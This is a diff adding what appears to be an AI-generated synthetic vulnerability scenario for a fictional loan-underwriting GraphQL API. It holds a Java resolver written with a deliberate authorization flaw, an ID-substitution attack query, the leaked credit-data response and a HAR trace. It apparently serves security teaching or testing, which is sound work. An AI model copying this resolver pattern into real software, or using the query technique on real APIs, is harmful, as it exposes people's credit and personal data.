@@ -1,0 +1,237 @@
+Here is the thirty-first system, focusing on GraphQL-specific security failures. We are shifting into the **Financial Services / Loan Origination** sector, focusing on an **Underwriting Application GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 5.2 (Resolver Traversal / BOLA in Edges)** combined with **Pattern 1.7 (Nested resources without parent authorization)**. This scenario demonstrates how an attacker, authorized to read a benign parent object (their own loan application), exploits a weak resolver to traverse the graph and retrieve restricted sibling data (the full, unredacted credit report summary) belonging to a different, unauthorized application.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** CapitalFlow Underwriting GraphQL API
+**Document Version:** 8.0.0 (FINAL)
+**Classification:** STRICTLY CONFIDENTIAL / GLBA & PII SCOPE
+**Domain:** Financial Services / Loan Origination / Credit Reporting
+
+## 1.0 Executive Summary
+CapitalFlow processes millions of retail loan applications. The underwriting system relies on a centralized GraphQL API to fetch aggregated data views for loan officers (e.g., application details, credit report summaries, decision rationale).
+
+Data integrity is paramount: A single GraphQL query often combines general application data (non-sensitive) with highly sensitive supporting documents (credit reports). The core security requirement is that every nested data field must re-validate the user's right to access that specific sensitive object (BOLA), and the system must prevent users from swapping the ID of the sensitive nested object to target a different application's data.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture uses a microservice approach, with GraphQL stitching data from specialized services.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **Edge WAF:** Filters standard web attacks.
+* **Apollo Federation Gateway:** The centralized entry point, responsible for parsing the query and routing fields to the correct microservices.
+
+### 2.2 The Backend Core Services
+* **Application Service (Node.js):** Handles the root `LoanApplication` entity.
+* **Credit Service (Java Spring):** Handles the sensitive `CreditReportSummary` entity. This service contains the vulnerable resolver logic.
+
+## 3.0 Identity, Sessions, and Object Authorization
+The security model relies on transactional object-level isolation.
+
+### 3.1 Authorization Policy
+A user is authorized to read a `CreditReportSummary` only if:
+They are an authenticated loan officer.
+The summary's parent `LoanApplication` ID is associated with applications assigned to that loan officer's territory.
+### 3.2 The Field-Level BOLA Flaw
+The `LoanApplication` object correctly enforces BOLA (Pattern 1.1) on the top-level ID. However, the nested `CreditReportSummary` field allows the client to explicitly pass the summary's unique ID (`summaryId`) as a query argument. The nested resolver fails to perform a cross-reference check to ensure the supplied `summaryId` actually belongs to the parent `LoanApplication` ID being queried.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The `CreditReportSummary` was refactored as a standalone entity with its own ID (`sum-UUID`) to facilitate caching. The nested resolver was not updated to enforce the foreign key relationship check, creating a side-channel BOLA attack vector. Tracked as RISK-GRPH-802.*
+
+### 4.1 Vulnerability A: GraphQL Traversal with ID Substitution on Nested Field
+**Taxonomy Pattern:** 5.2 (Resolver traversal / BOLA in edges) & 1.7 (Nested resources without parent authorization)
+**Sub-system:** Credit Service Resolver (`LoanApplication.creditReportSummary`)
+
+**The Deep Architectural Flaw:**
+The attacker exploits a lack of contextual BOLA enforcement on a sensitive nested field.
+
+1. **Authorization Context (Pattern 1.7):** The attacker is authorized to view Loan Application A (`app-991`). Loan Application A has a Credit Summary ID of `sum-A`.
+
+2. **Traversal with ID Substitution (Pattern 5.2):** The attacker knows the Credit Summary ID of a target victim's application, Loan Application B, which they are unauthorized to access (`sum-B`). The attacker crafts a query that starts with their authorized application (`LoanApplication(id: "app-991")`), but then passes the victim's summary ID (`sum-B`) to the nested field's arguments.
+
+3. **The Resolver Bypass:** The Java resolver receives the request. It correctly determines that the user is authorized for `app-991` (the parent). It then executes the nested `creditReportSummary` resolver. This resolver prioritizes the supplied `summaryId` argument (`sum-B`) for a direct database lookup, completely ignoring the parent application context (`app-991`). The summary for the unauthorized victim is returned.
+
+**The Exploitation Path:**
+
+1. **The Setup:** An attacker (Loan Officer A) is authorized for Loan Application A (`app-991`). They guess or discover the Credit Summary ID of a victim's application (`sum-victim-001`).
+2. **The Query:** The attacker crafts a GraphQL query that targets their own application ID but substitutes the unauthorized credit summary ID into the nested field's arguments.
+3. **The Execution:** The query passes the top-level BOLA check. The nested resolver executes `CreditReportSummary.find(id: "sum-victim-001")`, which succeeds because the resolver is not context-aware and assumes the ID provided by the client is valid.
+4. **The Impact:** The attacker extracts the full credit history and financial details of an unauthorized customer, leading to a massive PII breach.
+
+***
+
+# CAPITALFLOW UNDERWRITING: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 5.1.0
+**Applies to Architecture:** CapitalFlow Underwriting GraphQL API v8.0.0
+
+## 5.0 Loan & Credit Data Schema (PostgreSQL)
+The database logically links the sensitive credit summary to the main loan application. The flaw is the resolver's failure to enforce this join.
+
+```sql
+-- Core Loan Application Table (Parent)
+CREATE TABLE loan_applications (
+app_id VARCHAR(50) PRIMARY KEY, -- e.g., 'app-991'
+loan_officer_id VARCHAR(50) NOT NULL,
+applicant_name VARCHAR(100),
+status VARCHAR(20) DEFAULT 'PENDING'
+);
+
+-- Credit Summary Table (Child/Sensitive)
+CREATE TABLE credit_report_summaries (
+summary_id VARCHAR(50) PRIMARY KEY, -- e.g., 'sum-A', 'sum-victim-001'
+app_id VARCHAR(50) REFERENCES loan_applications(app_id) NOT NULL, -- THE CRITICAL FOREIGN KEY
+credit_score INT,
+credit_utilization DECIMAL(5, 2),
+raw_credit_data JSONB -- Highly sensitive PII
+);
+
+CREATE INDEX idx_summary_app ON credit_report_summaries(app_id);
+```
+
+## 6.0 The Flawed Implementation (Java / Spring Boot Resolver)
+The nested resolver accepts a direct ID argument for the sensitive object, allowing the attacker to substitute the ID of an unauthorized sibling object.
+
+### 6.1 Vulnerable Nested Resolver
+```java
+// File: resolvers/creditReportSummary.java
+
+@Component
+public class CreditSummaryResolver implements GraphQLResolver<LoanApplication> {
+// LoanApplication.creditReportSummary(summaryId: ID)
+public CreditReportSummary creditReportSummary(LoanApplication parentApplication, String summaryId, DataFetchingEnvironment env) {
+    
+    // VULNERABILITY 5.2: Traversal with ID Substitution
+    // The resolver accepts a direct 'summaryId' argument and prioritizes it.
+    
+    String finalSummaryId;
+    if (summaryId != null) {
+        finalSummaryId = summaryId; // Attacker-supplied ID is used here: 'sum-victim-001'
+    } else {
+        // Fallback to parent application's associated summary ID (e.g., 'sum-A')
+        finalSummaryId = db.findSummaryIdByAppId(parentApplication.getAppId()); 
+    }
+    
+    // VULNERABILITY 1.7: Missing Foreign Key BOLA Check
+    // The code FAILS to check that finalSummaryId's parent app\_id matches the 
+    // current parentApplication.getAppId(). It only looks up the summary by its ID.
+    CreditReportSummary summary = db.findSummaryById(finalSummaryId);
+    
+    if (summary == null) {
+        throw new RuntimeException("Credit summary not found.");
+    }
+    
+    // The credit summary (including sensitive data) for the victim is returned.
+    return summary;
+}
+}
+```
+
+## 7.0 GraphQL API Contract (The ID Substitution)
+The attacker uses a valid query on their own application but substitutes the target ID in the nested field argument.
+
+### 7.1 Execute Nested ID Substitution
+**Endpoint:** `POST /graphql`
+**Description:** Queries a sensitive nested resource using an unauthorized ID.
+
+**Required Headers:**
+```http
+Authorization: Bearer <LoanOfficer_A_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload:**
+```graphql
+query BOLAOnNestedField {
+# Start with an authorized parent object
+loanApplication(id: "app-991") {
+appId
+applicantName
+# Exploit: Substitute the victim's summary ID into the nested field argument
+creditReportSummary(summaryId: "sum-victim-001") {
+summaryId
+creditScore
+creditUtilization
+rawCreditData
+}
+}
+}
+```
+
+**Success Response (200 OK - PII Leak):**
+```json
+{
+"data": {
+"loanApplication": {
+"appId": "app-991",
+"applicantName": "Attacker Loan Officer",
+"creditReportSummary": {
+"summaryId": "sum-victim-001",
+"creditScore": 790,
+"creditUtilization": 0.15,
+"rawCreditData": "{ \"collections\": 0, \"bankruptcies\": 0, \"full_ssn\": \"*--5555\" }"
+}
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL ID SUBSTITUTION ON NESTED FIELD (HAR TRACE)
+**Applies to Architecture:** CapitalFlow Underwriting GraphQL API v8.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 5.2 & Pattern 1.7)
+
+This HTTP Archive (HAR) trace captures the execution of the BOLA attack via a nested GraphQL field argument. The attacker, authenticated as a Loan Officer, submits a query that targets an application they are authorized to view (`loanApplication(id: "app-991")`).
+
+The attacker then uses the graph traversal feature, supplying the ID of a highly sensitive object belonging to a victim (`creditReportSummary(summaryId: "sum-victim-001")`) as an argument to the nested resolver. The backend fails to verify the foreign key relationship between the parent application (`app-991`) and the supplied child summary ID, resulting in the leakage of the victim's credit score and partial SSN data. The `200 OK` response confirms the full data exfiltration.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Apollo Federation Gateway Logs",
+"version": "8.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T12:35:10.115Z",
+"time": 92,
+"request": {
+"method": "POST",
+"url": "https://api.capitalflow.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.capitalflow.com" },
+{ "name": "authorization", "value": "Bearer LO_A_JWT_88192..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query BOLAOnNestedField { loanApplication(id: \\\"app-991\\\") { appId applicantName creditReportSummary(summaryId: \\\"sum-victim-001\\\") { summaryId creditScore rawCreditData } } }\"}"
+},
+"bodySize": 280
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-nodes", "value": "Application, CreditSummary: 2" }
+],
+"content": {
+"size": 450,
+"mimeType": "application/json",
+"text": "{\"data\": {\"loanApplication\": {\"appId\": \"app-991\", \"applicantName\": \"Attacker Loan Officer\", \"creditReportSummary\": {\"summaryId\": \"sum-victim-001\", \"creditScore\": 790, \"creditUtilization\": 0.15, \"rawCreditData\": \"{ \\\"collections\\\": 0, \\\"bankruptcies\\\": 0, \\\"full_ssn\\\": \\\"*--5555\\\" }\" } } } }"}"
+},
+"bodySize": 450
+}
+}
+]
+}
+}
+```
+
+***
